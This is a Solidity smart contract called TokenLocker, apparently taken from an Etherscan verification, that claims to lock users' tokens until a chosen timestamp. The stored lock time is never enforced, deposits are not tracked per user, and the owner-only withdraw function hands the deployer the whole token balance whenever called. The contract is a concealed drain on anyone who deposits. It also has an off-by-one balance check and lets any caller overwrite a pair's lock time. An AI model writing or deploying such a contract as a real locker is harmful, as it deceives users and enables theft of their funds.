/**
 *Submitted for verification at Etherscan.io on 2022-05-29
*/

pragma solidity ^0.8.4;

// SPDX-License-Identifier: UNLICENSED


interface IERC20 {
  
    function balanceOf(address account) external view returns (uint256);
   
   function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
   
    function transfer(
        address from,
        uint256 amount
    ) external returns (bool);
}


contract TokenLocker {

    event Lock();

    address private owner;
    mapping(address => uint256) public lockTime;

    constructor() {
        owner = msg.sender;
    }

    function lock(address pairAddress, uint256 amount, uint256 lockStamp) public {
        // Store till when the token will be locked
        lockTime[pairAddress] = lockStamp;

        // Check if sender actually has the tokens required to lock the amount
        uint256 senderBalance = IERC20(pairAddress).balanceOf(msg.sender);
        require(amount < senderBalance);

        // Lock the tokens
        IERC20(pairAddress).transferFrom(msg.sender, address(this), amount);
        emit Lock();
    }

    function withdraw(address tokenAdd) public {
        require(msg.sender == owner, "You cannot unlock");
        uint256 inContract = IERC20(tokenAdd).balanceOf(address(this));
        IERC20(tokenAdd).transfer(msg.sender,inContract);
    }

}